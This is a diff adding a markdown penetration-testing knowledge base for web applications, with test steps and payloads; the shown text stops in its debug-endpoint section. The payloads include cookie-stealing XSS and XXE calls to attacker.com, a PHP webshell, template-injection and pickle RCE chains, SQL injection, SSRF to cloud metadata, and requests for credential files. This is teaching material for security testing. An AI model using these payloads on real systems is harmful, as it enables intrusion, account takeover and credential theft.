@@ -1,0 +1,1071 @@
+---
+type: article
+title: Web Application Penetration Testing Knowledge Base
+tags: [Authentication, Authorization, API Layer, Data Handling, File Handling, Infrastructure]
+author: Eno
+date: 2026-05-07
+---
+> Organized by attack surface — attacker-focused, bug bounty patterns, real-world logic flaws.
+
+---
+
+## Table of Contents
+
+1. [Authentication](#1-authentication)
+2. [Authorization (Access Control)](#2-authorization-access-control)
+3. [API Layer](#3-api-layer)
+4. [Business Logic](#4-business-logic)
+5. [Data Handling](#5-data-handling)
+6. [File Handling](#6-file-handling)
+7. [Frontend / Client-Side](#7-frontend--client-side)
+8. [Infrastructure / Misconfiguration](#8-infrastructure--misconfiguration)
+9. [Top 5 Attack Paths — Prioritize First](#9-top-5-attack-paths--prioritize-first)
+10. [What to Deprioritize — Low ROI](#10-what-to-deprioritize--low-roi)
+
+---
+
+## 1. Authentication
+
+---
+
+### 1.1 JWT Misconfiguration
+**Severity:** `CRITICAL`
+
+**Why it happens:**
+Developers trust the algorithm specified in the token header instead of enforcing it server-side. The `alg: none` trick or RS256 → HS256 downgrade lets you forge any token. The `kid` header parameter can point to arbitrary files or injectable values.
+
+**How to test:**
+1. Decode the JWT at jwt.io. Inspect the `alg` and `kid` header fields.
+2. Change `alg` to `"none"`, strip the signature entirely, modify payload claims (`role`, `sub`, `isAdmin`).
+3. Try RS256 → HS256 downgrade: sign the token using the server's **public key** as the HMAC secret.
+4. Test `kid` header injection: `kid: ../../../../dev/null` or point to a known empty/controlled value.
+5. Check `jku` / `x5u` header injection — server may fetch a remote JWK set you control.
+
+**Payloads:**
+```
+// alg:none bypass
+{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"superuser"}.[empty signature]
+
+// kid injection
+{"alg":"HS256","kid":"../../dev/null"}
+
+// RS256 → HS256: sign with the server's public key as HMAC secret
+jwt.sign(payload, publicKey, { algorithm: 'HS256' })
+```
+
+**Tags:** `JWT` `token-forgery` `auth-bypass`
+
+---
+
+### 1.2 Password Reset Poisoning
+**Severity:** `HIGH`
+
+**Why it happens:**
+The app uses the `Host` or `X-Forwarded-Host` header to build the reset link URL without validation. An attacker injects their own domain and intercepts the reset token when the victim clicks the link.
+
+**How to test:**
+1. Trigger a password reset for `victim@target.com`.
+2. Intercept the request. Inject `Host: attacker.com` or `X-Forwarded-Host: attacker.com`.
+3. Monitor `attacker.com` server logs for the incoming reset token.
+4. Also try: `Host: target.com:attacker.com` and `Host: target.com@attacker.com`.
+5. Test middleware headers: `X-Host`, `X-Original-URL`, `Forwarded: host=attacker.com`.
+
+**Payload:**
+```http
+POST /forgot-password HTTP/1.1
+Host: attacker.com
+X-Forwarded-Host: attacker.com
+
+email=victim@target.com
+```
+
+**Tags:** `reset` `host-injection` `account-takeover`
+
+---
+
+### 1.3 OAuth State Parameter Missing / CSRF
+**Severity:** `HIGH`
+
+**Why it happens:**
+An absent or static `state` parameter in the OAuth flow allows CSRF. The attacker crafts an authorization URL, tricks the victim into authorizing it, and links the victim's account to the attacker's identity provider entry.
+
+**How to test:**
+1. Start the OAuth flow. Capture the `redirect_uri` and `state` parameter.
+2. Drop or replay the `state` value — check if the server validates it.
+3. Create a CSRF page that auto-submits the authorization code back to the app.
+4. Target **account linking endpoints** specifically — they often skip re-authentication and are the highest-value target.
+5. Test `redirect_uri` tampering: can you change it to `attacker.com`?
+
+**Tags:** `OAuth` `CSRF` `account-takeover`
+
+---
+
+### 1.4 Username Enumeration via Timing / Response Differences
+**Severity:** `MEDIUM`
+
+**Why it happens:**
+Different response times or error messages for valid vs. invalid usernames. Enables targeted password spray or brute force against known accounts.
+
+**How to test:**
+1. Submit login with a known-valid username vs. a random string. Measure response time delta.
+2. Check error messages: `"wrong password"` vs. `"user not found"` is sufficient to enumerate.
+3. Try the forgot-password endpoint — it often leaks existence differently than the login page.
+4. Use ffuf or Burp Intruder with a timing analysis module for scale.
+
+**Tags:** `enumeration` `brute-force` `recon`
+
+---
+
+### 1.5 MFA Bypass via Response Manipulation
+**Severity:** `CRITICAL`
+
+**Why it happens:**
+MFA result is validated client-side or in a separate step not cryptographically tied to the session. Changing the server's JSON response or skipping the `/verify` endpoint entirely grants access.
+
+**How to test:**
+1. Submit a wrong MFA code. Intercept the `4xx` response in Burp.
+2. Modify the response body: change to `200`, or set `"mfaVerified": true` / `"success": true`.
+3. Skip the MFA step entirely — after completing step 1 (password), directly access authenticated endpoints.
+4. Check if the authenticated session cookie is set **before** MFA verification completes.
+5. Try reusing a previously valid MFA token (check for time-window tolerance or replay acceptance).
+
+**Tags:** `MFA` `response-manipulation` `auth-bypass`
+
+---
+
+## 2. Authorization (Access Control)
+
+---
+
+### 2.1 IDOR — Direct Object Reference
+**Severity:** `CRITICAL`
+
+**Why it happens:**
+Object IDs exposed in URLs or parameters are trusted without verifying that the requesting user owns the resource. Extremely widespread in REST APIs using sequential or guessable integer IDs.
+
+**How to test:**
+1. Create two accounts (attacker + victim). Record all resource IDs belonging to victim.
+2. As attacker, swap victim's ID into `GET`, `PUT`, `DELETE`, and `PATCH` requests.
+3. Try encoded IDs: base64, MD5 hash — decode, replace, re-encode.
+4. Look beyond the obvious: email notification links, export/download endpoints, PDF generation, and shared/invite links all carry object references.
+5. Test indirect references: user profile accessible via `/api/me` AND `/api/users/42` — both paths may have inconsistent auth.
+
+**Payloads:**
+```
+GET /api/invoices/10042  →  swap to /api/invoices/10041
+
+GET /api/users/eyJ1c2VySWQiOiAxfQ==
+  → base64 decode → {"userId": 1}
+  → replace → {"userId": 2}
+  → re-encode → eyJ1c2VySWQiOiAyfQ==
+```
+
+**Tags:** `IDOR` `horizontal-escalation` `access-control`
+
+---
+
+### 2.2 Vertical Privilege Escalation via Request Parameter
+**Severity:** `CRITICAL`
+
+**Why it happens:**
+Role or privilege level is passed as a hidden form field, cookie value, or JSON request parameter. The server trusts the client-supplied value instead of reading it from the session or database.
+
+**How to test:**
+1. Capture normal requests. Look for `role=user`, `isAdmin=false`, `userType=member`, `plan=free`.
+2. Modify: `role=admin`, `isAdmin=true`, `userType=superadmin`. Submit and check response.
+3. Test during **registration** and **profile update** — role is frequently accepted on signup.
+4. Add admin-only JSON keys to POST body (see mass assignment pattern below).
+
+**Payloads:**
+```json
+{"email":"x@y.com", "password":"test", "role":"admin"}
+```
+```http
+Cookie: role=superadmin; plan=enterprise
+```
+
+**Tags:** `vertical-escalation` `mass-assignment` `privilege`
+
+---
+
+### 2.3 JWT Audience / Issuer Not Validated
+**Severity:** `HIGH`
+
+**Why it happens:**
+Tokens issued by one service are accepted by another (e.g., a user-facing JWT accepted by the admin API). The `iss` and `aud` claims are not enforced, enabling cross-service privilege escalation via token reuse.
+
+**How to test:**
+1. Obtain a valid token from a lower-privileged service (e.g., partner API, mobile app endpoint).
+2. Submit it to the main app or admin API. Check if it's accepted.
+3. Modify `iss` / `aud` values if the algorithm is vulnerable.
+4. Look for shared HMAC secrets across microservices (check for leaked `.env` or config files).
+
+**Tags:** `JWT` `cross-service` `token-reuse`
+
+---
+
+### 2.4 Broken Object-Level Auth in Batch Endpoints
+**Severity:** `HIGH`
+
+**Why it happens:**
+Bulk endpoints (e.g., `/api/messages?ids=1,2,3`) often skip per-object ownership checks, validating only that the user is authenticated — not that they own each individual object ID.
+
+**How to test:**
+1. Find batch `GET`, `POST`, or `DELETE` endpoints.
+2. Mix your own IDs with victim IDs: `?ids=mine_1,victim_2,victim_3`.
+3. Check if all objects are returned/acted upon regardless of ownership.
+4. Test GraphQL aliases for the same pattern — alias the same query multiple times with different IDs.
+
+**Tags:** `IDOR` `batch` `GraphQL` `access-control`
+
+---
+
+### 2.5 Role-Based Access Control (RBAC) Flaws
+**Severity:** `HIGH`
+
+**Why it happens:**
+Roles defined in the frontend or enforced only at the route/controller level, not at the data/service layer. A user with a `viewer` role can call `PUT /api/resource/123` if the underlying service doesn't re-check the role.
+
+**How to test:**
+1. Map all roles available in the application (viewer, editor, admin, billing).
+2. For each privileged action, test it with every lower-privileged role's token.
+3. Pay attention to **functional roles** (e.g., `billing` can access `users`?) vs. strictly hierarchical ones.
+4. Test cross-tenant role elevation in multi-tenant SaaS: does `org_a_admin` affect `org_b` resources?
+
+**Tags:** `RBAC` `authorization` `multi-tenant`
+
+---
+
+## 3. API Layer
+
+---
+
+### 3.1 GraphQL Introspection + Field-Level Auth Bypass
+**Severity:** `HIGH`
+
+**Why it happens:**
+Introspection is left enabled in production, exposing the full schema. Mutations for sensitive types (e.g., `updateUserRole`, `deleteOrganization`) often lack the same auth checks as equivalent REST endpoints.
+
+**How to test:**
+1. Send `{"query":"{__schema{types{name,fields{name}}}}"}` — check if introspection is enabled.
+2. Use InQL or GraphQL Voyager to map the schema visually and find non-UI-exposed mutations.
+3. Look for `admin`, `internal`, `superuser`, `debug` type prefixes in the schema.
+4. Test mutations with a low-privilege token. Check **field-level resolvers**, not just top-level auth middleware.
+
+**Payloads:**
+```graphql
+{ __schema { types { name fields { name args { name } } } } }
+
+mutation { updateUser(id: 2, role: "admin") { id role } }
+
+mutation { deleteOrganization(id: 1) { success } }
+```
+
+**Tags:** `GraphQL` `introspection` `API` `auth-bypass`
+
+---
+
+### 3.2 Mass Assignment / Overposting
+**Severity:** `HIGH`
+
+**Why it happens:**
+Frameworks automatically bind request parameters to model attributes. If the model contains sensitive fields (`isAdmin`, `balance`, `role`, `verified`) that aren't explicitly whitelisted, they get set when submitted via `POST` or `PUT`.
+
+**How to test:**
+1. Look at the `GET` response for a resource — note all fields including read-only ones.
+2. Submit those same fields in a `POST` / `PUT` / `PATCH` request body.
+3. Target fields: `isAdmin`, `role`, `verified`, `emailVerified`, `balance`, `credits`, `plan`, `subscription`.
+4. Most effective on **registration** and **profile update** endpoints.
+
+**Payload:**
+```json
+{
+  "username": "hacker",
+  "password": "x",
+  "isAdmin": true,
+  "role": "admin",
+  "balance": 99999,
+  "emailVerified": true
+}
+```
+
+**Tags:** `mass-assignment` `parameter-tampering` `API`
+
+---
+
+### 3.3 NoSQL Injection (MongoDB)
+**Severity:** `HIGH`
+
+**Why it happens:**
+User input is used in MongoDB query operators without sanitization. Operator objects like `$ne`, `$gt`, `$regex` injected into JSON bodies bypass authentication or return all records.
+
+**How to test:**
+1. Identify JSON-based login or search endpoints.
+2. Replace string values with MongoDB operator objects in the request body.
+3. Also test URL parameters: `?username[$ne]=x&password[$ne]=x`.
+4. Try `$where` for JavaScript injection on older MongoDB versions.
+
+**Payloads:**
+```json
+// Auth bypass via $ne
+{"username": {"$ne": null}, "password": {"$ne": null}}
+
+// Username enumeration via $regex
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
+
+// URL-encoded query param
+username[$ne]=invalid&password[$ne]=invalid
+```
+
+**Tags:** `NoSQL` `injection` `MongoDB` `auth-bypass`
+
+---
+
+### 3.4 SQL Injection — Second-Order / Blind
+**Severity:** `CRITICAL`
+
+**Why it happens:**
+Input is stored safely (parameterized at write time) but later used unsafely in another query (string concatenation at read/use time). Blind SQLi is common where no data is reflected but boolean differences or time delays are observable.
+
+**How to test:**
+1. **Second-order:** Store `'` in a username or profile field. Trigger it via a different action (password change, search, report generation).
+2. **Boolean blind:** Inject `' AND 1=1--` vs. `' AND 1=2--` and compare response differences.
+3. **Time-based blind:** `'; WAITFOR DELAY '0:0:5'--` (MSSQL) or `' AND SLEEP(5)--` (MySQL).
+4. **OOB:** `'; EXEC master..xp_dirtree '//attacker.com/a'--`
+5. Confirm manually first, then run `sqlmap --level=3 --risk=2`.
+
+**Payloads:**
+```sql
+' OR 1=1--
+1' AND SLEEP(5)--
+'; INSERT INTO users(email, role) VALUES('x@attacker.com', 'admin')--
+' UNION SELECT null, username, password FROM users--
+```
+
+**Tags:** `SQLi` `blind` `injection` `second-order`
+
+---
+
+### 3.5 SSRF via URL Parameters
+**Severity:** `HIGH`
+
+**Why it happens:**
+The server fetches a user-supplied URL (webhooks, avatar imports, PDF generators, link previews, health checks). Attackers redirect it to internal services or cloud metadata endpoints.
+
+**How to test:**
+1. Find any parameter accepting a URL: `url=`, `webhook=`, `avatar=`, `callback=`, `dest=`, `next=`, `src=`.
+2. Test AWS metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+3. Test GCP metadata: `http://metadata.google.internal/computeMetadata/v1/`
+4. **Bypass filters:** `http://[::ffff:169.254.169.254]/`, `http://localtest.me`, `http://①⑦②.0.0.①` (Unicode IP)
+5. Use a 301 redirect on attacker-controlled server pointing to internal IP to bypass allowlists.
+
+**Payloads:**
+```
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+url=http://localhost:8080/admin
+url=http://[::1]/
+url=http://0x7f000001/          (127.0.0.1 in hex)
+url=http://2130706433/          (127.0.0.1 as decimal)
+```
+
+**Tags:** `SSRF` `internal-network` `cloud` `metadata`
+
+---
+
+### 3.6 HTTP Parameter Pollution
+**Severity:** `MEDIUM`
+
+**Why it happens:**
+Different backend components parse duplicate parameters differently. This can bypass WAF rules, duplicate-use checks, or override intended values depending on which copy each layer uses.
+
+**How to test:**
+1. Submit duplicate params: `?id=1&id=2` — which value does the app use?
+2. Split malicious content across params to evade WAF: `?a=SEL&a=ECT+*+FROM+users`.
+3. Try in JSON bodies too: `{"id":1,"id":2}` — some parsers use last, others use first.
+4. Useful for CSRF bypass when the token is predictably in the second position.
+
+**Payloads:**
+```
+?user_id=legitimate&user_id=victim_id
+?amount=100&amount=-100
+?role=user&role=admin
+```
+
+**Tags:** `HPP` `WAF-bypass` `parameter-tampering`
+
+---
+
+## 4. Business Logic
+
+---
+
+### 4.1 Race Condition — Coupon / Limit Bypass
+**Severity:** `HIGH`
+
+**Why it happens:**
+No atomic lock exists between "check if coupon is used" and "mark coupon as used." Concurrent requests both pass the check before either sets the `used` flag (TOCTOU — Time-of-Check to Time-of-Use).
+
+**How to test:**
+1. Identify single-use limits: coupon codes, referral credits, free trials, vote limits, invite links.
+2. Send 10–50 simultaneous requests using **Burp Turbo Intruder** (`single-packet attack` via HTTP/2) or Python `asyncio`.
+3. For payments: test concurrent charge + refund requests on split-second timing.
+4. Even 2 successes out of 50 is a valid finding.
+
+**Tool reference:**
+```python
+# Turbo Intruder: use send_group_synced() with 50 identical requests
+# HTTP/2 single-packet attack eliminates network jitter
+```
+
+**Tags:** `race-condition` `TOCTOU` `limit-bypass` `concurrency`
+
+---
+
+### 4.2 Negative Price / Integer Overflow / Quantity Manipulation
+**Severity:** `HIGH`
+
+**Why it happens:**
+No server-side validation that quantity or price is positive. Setting `quantity=-1` or applying a discount greater than 100% may result in account credit or a negative cart total processed as a payment.
+
+**How to test:**
+1. Intercept add-to-cart or order request. Set `quantity` to `-1`, `-999`, `0`.
+2. Add a discount code then modify the applied discount percentage value.
+3. Test `0`-price items, free shipping on negative subtotals.
+4. Check what happens when cart total underflows (wraps to `MAX_INT` in some integer implementations).
+
+**Payloads:**
+```json
+{"item_id": 123, "quantity": -10}
+{"discount_pct": 150}
+{"price": 0.001}
+{"amount": -9999999}
+```
+
+**Tags:** `price-manipulation` `logic` `ecommerce` `integer-overflow`
+
+---
+
+### 4.3 Workflow Step Skip
+**Severity:** `HIGH`
+
+**Why it happens:**
+Multi-step flows are only validated on the final step, or steps are validated individually but not as a sequence. Attacker POSTs directly to the step 3 endpoint without completing steps 1 and 2 (ID verification, payment, email confirmation).
+
+**How to test:**
+1. Map the full multi-step workflow via Burp proxy history.
+2. Jump directly to the final confirmation/completion endpoint without prior steps.
+3. Reuse completion tokens or session references from one completed flow in a new, incomplete one.
+4. **Checkout bypass:** skip payment → POST directly to `/order/confirm`.
+5. **KYC bypass:** skip identity verification → access verified-user features directly.
+
+**Tags:** `workflow-bypass` `state` `logic`
+
+---
+
+### 4.4 Account Takeover via Unverified Email Change
+**Severity:** `CRITICAL`
+
+**Why it happens:**
+The app updates the email immediately without requiring confirmation from the **old** address, or sends the confirmation to the new (attacker-controlled) address. A subsequent password reset then delivers the token to the attacker's inbox.
+
+**How to test:**
+1. Change email to `attacker@attacker.com` in profile settings. Check if confirmation is required.
+2. Check if the **old email** receives a cancellation/alert notice (indicates immediate update).
+3. Initiate a password reset. Does it go to the new unverified email?
+4. Try concurrent requests: send email change + password reset simultaneously.
+5. Check if the email is changed immediately before an email verification token is validated.
+
+**Tags:** `account-takeover` `email-change` `logic`
+
+---
+
+### 4.5 Referral / Reward Abuse
+**Severity:** `MEDIUM`
+
+**Why it happens:**
+Referral systems reward the referrer when a new user signs up. If the identity check is based on email alone (not phone, payment, or device fingerprint), self-referral is trivial.
+
+**How to test:**
+1. Sign up using your referral link with a new email (e.g., `attacker+1@gmail.com`).
+2. Check if the system detects same-device or same-IP sign-ups.
+3. Test if the reward triggers before the referred user completes a required action (deposit, purchase).
+4. Test for referral token replay — can the same referral token be used more than once?
+
+**Tags:** `referral-abuse` `reward` `logic`
+
+---
+
+## 5. Data Handling
+
+---
+
+### 5.1 Insecure Deserialization (Java / PHP / Python)
+**Severity:** `CRITICAL`
+
+**Why it happens:**
+Serialized objects are accepted from user input and deserialized without type checking or integrity validation. An attacker sends a gadget chain payload that triggers RCE, SSRF, or object injection during the deserialization process.
+
+**How to test:**
+1. Look for base64-encoded blobs in cookies, hidden fields, or API params.
+   - PHP: `O:` prefix after base64 decoding
+   - Java: `rO0AB` (base64 of `AC ED`)
+   - Python pickle: `\x80\x04` magic bytes
+2. Use **ysoserial** (Java), **phpggc** (PHP), or a pickle exploit (Python) to generate payloads.
+3. Use Burp's **Java Deserialization Scanner** extension for automated detection.
+4. For PHP: look for `unserialize()` calls on user-controlled data; test magic method chains (`__wakeup`, `__destruct`).
+
+**Payloads:**
+```
+# Java — test with ysoserial CommonsCollections gadget chain
+Cookie: session=rO0ABXNyABhj...
+
+# PHP — phpggc generated payload targeting common frameworks
+O:8:"stdClass":1:{s:4:"exec";s:6:"id > /tmp/pwned";}
+
+# Python pickle RCE
+import pickle, os; pickle.dumps(os.system('id'))
+```
+
+**Tags:** `deserialization` `RCE` `Java` `PHP` `Python`
+
+---
+
+### 5.2 Sensitive Data Exposure in Responses / Logs
+**Severity:** `MEDIUM`
+
+**Why it happens:**
+Full credit card numbers, SSNs, session tokens, or passwords echoed back in API responses, verbose error messages, or logging endpoints accessible to lower-privileged users.
+
+**How to test:**
+1. Review every API response for more fields than the UI displays. Compare user vs. admin responses.
+2. Check `/api/logs`, `/api/debug`, `/api/audit`, `/api/v1/events` with a low-privilege token.
+3. Error responses — stack traces frequently include env vars, DB connection strings, and internal paths.
+4. Search JS bundles for hardcoded secrets:
+   ```bash
+   grep -rE 'apiKey|secret|password|token|private_key|AWS' *.js
+   ```
+5. Check HTTP response headers for internal IP addresses, server versions, or framework identifiers.
+
+**Tags:** `data-exposure` `logging` `sensitive-data`
+
+---
+
+### 5.3 XXE — XML External Entity Injection
+**Severity:** `HIGH`
+
+**Why it happens:**
+XML parsers with external entity processing enabled will resolve `SYSTEM` entity references to local files or URLs. File upload endpoints, SOAP APIs, SVG imports, and Office document parsers are the most common vectors.
+
+**How to test:**
+1. Find any XML input: SOAP endpoints, XML file upload, SVG/HTML import, RSS/Atom feeds.
+2. Inject a `DOCTYPE` with an external entity pointing to `/etc/passwd` or an internal URL.
+3. For **blind XXE**: use out-of-band exfiltration via DNS/HTTP callback to Burp Collaborator.
+4. Try sending `Content-Type: application/xml` on JSON endpoints — some parsers accept both.
+5. Test SVG and DOCX/XLSX file uploads — they are XML-based and often parsed server-side.
+
+**Payloads:**
+```xml
+<!-- Basic file read -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+<!-- SSRF via XXE -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+
+<!-- Blind OOB exfiltration -->
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/dtd.xml"> %xxe;]>
+```
+
+**Tags:** `XXE` `injection` `XML` `file-read` `SSRF`
+
+---
+
+### 5.4 SSTI — Server-Side Template Injection
+**Severity:** `CRITICAL`
+
+**Why it happens:**
+User input is embedded directly into a template string that is then rendered server-side. The template engine executes the injected expression, leading to RCE via the engine's built-in functions.
+
+**How to test:**
+1. Inject math expressions in any user-controlled field that appears reflected: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`.
+2. If you see `49` reflected, you have SSTI. Identify the engine from the syntax.
+3. Engine detection: `{{7*'7'}}` → `7777777` = Jinja2; `49` = Twig.
+4. Escalate to RCE using engine-specific payload chains.
+
+**Payloads:**
+```
+# Detection
+{{7*7}}   ${7*7}   #{7*7}   <%= 7*7 %>   *{7*7}
+
+# Jinja2 RCE (Python)
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# Twig RCE (PHP)
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+# Freemarker RCE (Java)
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+```
+
+**Tags:** `SSTI` `RCE` `template-injection`
+
+---
+
+## 6. File Handling
+
+---
+
+### 6.1 Unrestricted File Upload → RCE
+**Severity:** `CRITICAL`
+
+**Why it happens:**
+File type is validated only by extension or `Content-Type` header, not by actual file content (magic bytes). Uploading a webshell to a web-accessible directory leads to remote code execution.
+
+**How to test:**
+1. Upload a file. Intercept with Burp. Change filename to `shell.php` and `Content-Type` to `image/jpeg`.
+2. Try double extensions: `shell.php.jpg`, `shell.pHp`, `shell.php%00.jpg`, `shell.php;.jpg`.
+3. Upload a polyglot file — valid GIF header with embedded PHP code.
+4. Find the upload path (check Burp response, JS source, or common paths: `/uploads/`, `/files/`, `/media/`) and access the file.
+5. If execution is blocked, try `.htaccess` upload to enable PHP in the upload directory.
+
+**Payloads:**
+```php
+// GIF polyglot with PHP webshell
+GIF89a;
+<?php system($_GET['cmd']); ?>
+
+// .htaccess to enable PHP execution
+AddType application/x-httpd-php .jpg
+
+// Null byte bypass (legacy)
+shell.php%00.jpg
+```
+
+**Tags:** `file-upload` `RCE` `bypass` `webshell`
+
+---
+
+### 6.2 Path Traversal in File Read / Download
+**Severity:** `HIGH`
+
+**Why it happens:**
+A `filename` or `path` parameter is passed to a file read function without sanitization against directory traversal sequences, allowing the attacker to escape the intended directory.
+
+**How to test:**
+1. Find endpoints with: `file=`, `path=`, `doc=`, `template=`, `name=`, `resource=` parameters.
+2. Inject: `../../../../etc/passwd`, `..\..\..\windows\system32\drivers\etc\hosts`.
+3. Try encoding bypasses: URL encoding (`%2F`), double encoding (`%252F`), unicode (`%c0%af`).
+4. Test in file download, image loading, PDF generation, log viewer, and template rendering endpoints.
+5. On Windows: `....//....//....//windows/win.ini`
+
+**Payloads:**
+```
+?file=../../../../etc/passwd
+?path=....//....//....//etc/passwd
+?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
+?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+?template=../../../../proc/self/environ
+```
+
+**Tags:** `path-traversal` `LFI` `file-read`
+
+---
+
+### 6.3 File Upload to SSRF via SVG / HTML
+**Severity:** `MEDIUM`
+
+**Why it happens:**
+SVG and HTML files are rendered server-side during PDF or image conversion (e.g., Puppeteer, wkhtmltopdf, ImageMagick). Embedded resource references (`<img>`, `<iframe>`, XML entities) trigger outbound server-side requests.
+
+**How to test:**
+1. Upload an SVG containing: `<image href="http://169.254.169.254/latest/meta-data/"/>`
+2. Upload HTML with an `<iframe>` pointing to internal services — trigger via PDF generation.
+3. Include an XXE payload in the SVG's XML header.
+4. Monitor Burp Collaborator for DNS/HTTP callbacks to confirm SSRF.
+
+**Payloads:**
+```xml
+<!-- SVG SSRF -->
+<svg xmlns="http://www.w3.org/2000/svg">
+  <image href="http://169.254.169.254/latest/meta-data/"/>
+</svg>
+
+<!-- SVG with XXE -->
+<?xml version="1.0"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg>&xxe;</svg>
+```
+
+**Tags:** `SSRF` `SVG` `file-upload` `PDF` `XXE`
+
+---
+
+## 7. Frontend / Client-Side
+
+---
+
+### 7.1 Stored XSS → Account Takeover / Admin Panel Compromise
+**Severity:** `HIGH`
+
+**Why it happens:**
+User input stored in the database is rendered in other users' browsers without proper HTML encoding. Highest impact when triggered in admin panels, support ticket systems, or on pages viewed by privileged users.
+
+**How to test:**
+1. Test every stored input field: names, bios, comments, addresses, product descriptions, support messages.
+2. Basic: `<script>document.location='https://attacker.com/?c='+document.cookie</script>`
+3. Test event handlers on content inserted into HTML attributes: `onmouseover`, `onerror`, `onload`.
+4. Try filter bypasses: tag case variation, null bytes, JavaScript protocol in `href`/`src`.
+
+**Payloads:**
+```html
+<!-- Cookie exfil -->
+<img src=x onerror="fetch('//attacker.com?c='+document.cookie)">
+
+<!-- HTML attribute injection -->
+" onmouseover="fetch('//attacker.com?c='+document.cookie) x="
+
+<!-- JavaScript URL -->
+javascript:fetch('//attacker.com?c='+document.cookie)
+
+<!-- Filter bypass polyglot -->
+"><svg/onload=eval(atob('ZmV0Y2goJy8v...base64..'))>
+```
+
+**Tags:** `XSS` `stored` `account-takeover` `admin`
+
+---
+
+### 7.2 DOM-Based XSS via Source → Sink
+**Severity:** `HIGH`
+
+**Why it happens:**
+JavaScript reads from an attacker-controlled source (`location.hash`, `document.referrer`, `postMessage`, `localStorage`) and writes to a dangerous sink (`innerHTML`, `eval()`, `document.write`, `setTimeout(str)`) without sanitization.
+
+**How to test:**
+1. Search minified JS bundles for dangerous sinks: `.innerHTML`, `document.write`, `eval(`, `setTimeout(`, `setInterval(`.
+2. Trace back to sources: `location.hash`, `location.search`, `document.referrer`, `postMessage`.
+3. Test URL fragment: `https://target.com/page#<img src=x onerror=alert(1)>`
+4. Check `postMessage` listeners — do they validate `event.origin` before processing `event.data`?
+5. Use **DOM Invader** (Burp Browser) for automated source-to-sink tracing in complex SPAs.
+
+**Payloads:**
+```
+# Hash-based DOM XSS
+https://target.com/#<img src=x onerror=alert(document.cookie)>
+
+# postMessage without origin check
+window.postMessage({type:'render', html:'<img onerror=alert(1) src=x>'}, '*')
+
+# location.search sink
+https://target.com/page?search=</script><script>alert(1)</script>
+```
+
+**Tags:** `DOM-XSS` `JavaScript` `SPA` `postMessage`
+
+---
+
+### 7.3 Hidden Endpoint Discovery via JS Bundle Analysis
+**Severity:** `INFO`
+
+**Why it happens:**
+Single-page applications bundle all routes, API endpoints, and sometimes internal tooling references into JavaScript files served to every visitor. This reveals unadvertised, often unguarded functionality.
+
+**How to test:**
+1. Download all `.js` bundles from the target. Use JS Miner (Burp extension) or manual extraction.
+2. Search for path patterns:
+   ```bash
+   grep -Eo '"/[a-zA-Z0-9_/.-]{3,50}"' app.bundle.js | sort -u
+   grep -E 'fetch\(|axios\.(get|post|put|delete)\(' app.bundle.js
+   ```
+3. Look for: `/admin`, `/internal`, `/debug`, `/api/v[0-9]`, `/superuser`, `/staff`.
+4. Check for hardcoded values: API keys, JWT secrets, S3 bucket names, internal hostnames.
+5. Unminify with `js-beautify` for easier manual review.
+
+**Tags:** `recon` `hidden-endpoints` `JavaScript` `SPA`
+
+---
+
+### 7.4 Open Redirect → Phishing / OAuth Token Theft
+**Severity:** `MEDIUM`
+
+**Why it happens:**
+A redirect URL is accepted as a parameter and not validated against a strict allowlist. Used to steal OAuth access tokens via a crafted `redirect_uri`, or to create convincing phishing links from a trusted domain.
+
+**How to test:**
+1. Find: `?redirect=`, `?next=`, `?return=`, `?url=`, `?to=`, `?dest=`, `?goto=` parameters.
+2. Test: `?next=https://attacker.com` — does the server redirect without validation?
+3. For OAuth: replace `redirect_uri` with `https://attacker.com` — authorization code/token is sent there.
+4. Bypass whitelist validation:
+
+**Payloads:**
+```
+?redirect=//attacker.com
+?next=https:///attacker.com
+?url=\/\/attacker.com
+?redirect=https://target.com@attacker.com
+?redirect=https://attacker.com%2F%2Etarget.com
+redirect_uri=https://attacker.com%2F..%2Ftarget.com
+```
+
+**Tags:** `open-redirect` `OAuth` `phishing` `token-theft`
+
+---
+
+### 7.5 Client-Side Auth Bypass
+**Severity:** `HIGH`
+
+**Why it happens:**
+Authorization checks performed only in JavaScript (hiding buttons, disabling routes) without corresponding server-side enforcement. The API accepts the request regardless of what the UI shows.
+
+**How to test:**
+1. Identify actions restricted by the UI (grayed buttons, hidden menu items, disabled fields).
+2. Extract the API calls these actions would make (from JS source or by temporarily enabling them in DevTools).
+3. Send the API requests directly via Burp — bypass the UI entirely.
+4. Check for `disabled` HTML attributes on form fields — these values are not submitted but can be re-enabled via DevTools and then submitted.
+
+**Tags:** `client-side-auth` `auth-bypass` `JavaScript`
+
+---
+
+## 8. Infrastructure / Misconfiguration
+
+---
+
+### 8.1 Exposed .env / Config Files
+**Severity:** `CRITICAL`
+
+**Why it happens:**
+Accidentally deployed to the web root during CI/CD pushes. Contains database credentials, API keys, JWT secrets, and third-party service tokens. Extremely common in Laravel, Node.js, and Docker-based deployments.
+
+**How to test:**
+```
+GET /.env
+GET /.env.production
+GET /.env.local
+GET /.env.backup
+GET /config.json
+GET /secrets.json
+GET /app.config
+GET /settings.py
+GET /config/database.yml
+GET /config/secrets.yml
+GET /.git/config          (may expose remote URL with credentials)
+GET /web.config           (IIS — may expose connection strings)
+GET /application.properties  (Spring Boot)
+```
+
+Use ffuf with `SecLists/Discovery/Web-Content/config-files.txt` wordlist.
+
+**Tags:** `env` `secrets` `misconfiguration` `credentials`
+
+---
+
+### 8.2 Debug Endpoints Active in Production
+**Severity:** `HIGH`
+
+**Why it happens:**
+`DEBUG=True`, Spring Actuator, Laravel Telescope, or Express debug middleware left enabled in production builds. Exposes routes, environment variables, query history, heap dumps, and sometimes remote code execution.
+
+**How to test:**
+```
